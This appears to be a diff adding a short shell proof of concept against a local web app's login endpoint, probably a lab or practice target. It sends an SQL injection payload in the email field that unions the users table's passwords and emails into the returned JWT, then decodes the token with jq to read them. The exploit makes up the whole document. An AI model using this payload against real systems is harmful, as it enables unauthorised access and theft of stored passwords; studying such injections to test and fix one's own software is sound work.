@@ -1,0 +1,4 @@
+jwt() { jq -R 'split(".") | .[1] | @base64d | fromjson' <<< $1; }
+
+   token=$(curl -X POST http://localhost:5000/client_login -d 'userName=spammer&email=spam@email.com" union select password || ":" || email from users;--&password=pwd' | jq -j '.token')
+   jwt $token
